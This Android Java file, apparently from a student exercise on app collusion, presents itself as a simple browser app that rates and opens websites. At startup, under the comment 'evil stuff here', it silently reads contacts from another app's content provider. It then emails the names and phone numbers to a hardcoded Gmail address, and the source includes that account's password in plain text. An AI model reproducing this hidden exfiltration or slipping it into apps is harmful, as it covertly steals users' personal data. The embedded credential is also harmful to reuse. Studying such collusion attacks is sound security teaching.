package com.example.app2_browser;

import androidx.appcompat.app.AppCompatActivity;

import android.app.LoaderManager;
import android.content.Intent;
import android.content.Loader;
import android.content.UriMatcher;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Browser;
import android.provider.ContactsContract;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.content.CursorLoader;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity implements LoaderManager.LoaderCallbacks<Cursor> {

    private static final int RESULT_BROWSING_ENDED = 1;
    private EditText website;
    private Button search;
    private EditText rating;

    // content Provider
    private static final String AUTHORITY = "com.example.app1_contact";
    private static final String BASE_PATH = "contacts";
    public static final Uri CONTENT_URI = Uri.parse("content://" + AUTHORITY + "/" + BASE_PATH);

    // Constant to identify the requested operation
    private static final int CONTACTS = 1;
    private static final int CONTACT_ID = 2;

    private boolean firstTimeLoaded = false;


    private static final UriMatcher uriMatcher = new UriMatcher(UriMatcher.NO_MATCH);

    static {
        uriMatcher.addURI(AUTHORITY, BASE_PATH, CONTACTS);
        uriMatcher.addURI(AUTHORITY, BASE_PATH + "/#", CONTACT_ID);
    }

    private List<String> contacts;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        website = findViewById (R.id.websiteInput);
        search = findViewById (R.id.search);
        rating = findViewById (R.id.rating);
        String intentUrl = "";
        Uri startIntentData = getIntent().getData();
        if (startIntentData != null) {
            intentUrl = startIntentData.toString();
            if (intentUrl.contains("http://") || intentUrl.contains("https://")) {  // checking if the intent's data was meant to be a url
                // a method that handle opening urls by calling webView.loadUrl(String url)
                //Toast.makeText(this, intentUrl, Toast.LENGTH_SHORT).show();
                MyDatabaseHelper myDB = new MyDatabaseHelper(this);
                if (myDB.exists(intentUrl)){
                    List<String> result = myDB.search(intentUrl);
                    rating.setText(result.get(1));
                }
            }
        }

        website.setText(intentUrl);

        search.setOnClickListener (new View.OnClickListener () {
            @Override
            public void onClick(View v) {
                String intentUrl = website.getText().toString();
                if (intentUrl.contains("http://") || intentUrl.contains("https://")) {
                    Intent browse = new Intent(Intent.ACTION_VIEW, Uri.parse(intentUrl));
                    browse.putExtra(Browser.EXTRA_APPLICATION_ID, "com.android.chrome");
                    browse.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    browse.setPackage("com.android.chrome");
                    startActivity(browse);
                }
            }
        });

        rating.addTextChangedListener(new TextWatcher() {

            @Override
            public void afterTextChanged(Editable s) {}

            @Override
            public void beforeTextChanged(CharSequence s, int start,
                                          int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start,
                                      int before, int count) {
                if(s.length() == 0)
                    return;

                MyDatabaseHelper myDB = new MyDatabaseHelper(getBaseContext());
                if (myDB.exists(website.getText().toString())){
                    myDB.update(website.getText().toString(),new Integer(rating.getText().toString()));
                } else {
                    myDB.addLink(website.getText().toString(), new Integer(rating.getText().toString()));
                }

            }
        });

        // evil stuff here
        getLoaderManager().initLoader(0, null, this);
        //sendMail();
    }

    @Override
    public Loader<Cursor> onCreateLoader(int id, Bundle bundle) {
        if (id == 0) {
            return new CursorLoader(this, CONTENT_URI, null, null, null, null);
        }
        return null;
    }

    @Override
    public void onLoadFinished(Loader<Cursor> loader, Cursor cursor) {
        List<String> list = new ArrayList<>();

        while (cursor.moveToNext()) {

            String name = cursor.getString(1);
            int phone_no = cursor.getInt(2);

            String contact = name + " " + phone_no + "\n";
            list.add(contact);
        }

        // send data
        Log.d("myTag", "END LOADING : TOTAL CONTACTS " + list.size());
        contacts = list;
        sendMail();
    }

    @Override
    public void onLoaderReset(Loader<Cursor> loader) {

    }

    private void sendMail(){
        List<String> mailToList = new ArrayList<>();
        mailToList.add("collusion.enseirb@gmail.com");
        new SendMailTask(this).execute("collusion.enseirb@gmail.com",
                "CollEGL21", mailToList, "[Collusion-Belkebir-Bhati]", contacts.toString());
    }
}